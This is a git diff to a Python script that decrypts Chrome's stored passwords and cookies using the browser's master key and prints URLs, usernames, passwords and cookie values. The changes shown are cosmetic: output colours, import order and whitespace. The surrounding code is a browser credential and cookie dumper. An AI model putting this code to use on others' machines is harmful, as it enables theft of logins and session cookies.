@@ -1,8 +1,9 @@
-from colored import fg
 from Cryptodome.Cipher import AES
+from colored import fg
 
 block = fg('light_sky_blue_3a')
 title = fg('blue')
+main_title = fg('red')
 data = fg('dark_green_sea')
 
 
@@ -29,7 +30,7 @@ def decrypt_cipher(encrypted_password, chrome_master_key):
 
 
 def handle_chrome_passwords(creds_arr: [], chrome_master_key: str) -> None:
-    print(title + "Chrome Credentials:")
+    print(main_title + "Chrome Credentials:")
     for num in creds_arr:
         creds_json = creds_arr.get(num)
         enc_password = creds_json[2].get('password')
@@ -37,20 +38,22 @@ def handle_chrome_passwords(creds_arr: [], chrome_master_key: str) -> None:
         plaint_text_pass and output_chrome_credentials(
             [creds_json[0].get('url'), creds_json[1].get('username'), plaint_text_pass])
 
+
 def handle_chrome_cookies(cookies_arr: [], chrome_master_key: str) -> None:
-    print(title + "Chrome Cookies:")
+    print(main_title + "Chrome Cookies:")
     for cookie_obj in cookies_arr:
         cookie_domain = cookie_obj.get("Domain")
         enc_cookie = cookie_obj.get("Value")
         plaint_text_cookie = decrypt_cipher(enc_cookie, chrome_master_key=chrome_master_key)
         output_chrome_cookies([cookie_domain, plaint_text_cookie])
-   
+
 
 def output_chrome_credentials(print_object: []):
     print(block + '[--]')
     print(title + '|Url|' + data + print_object[0])
     print(title + '|Username|' + data + print_object[1])
     print(title + '|Password|' + data + print_object[2])
+
 
 def output_chrome_cookies(print_object: []):
     print(block + '[--]')
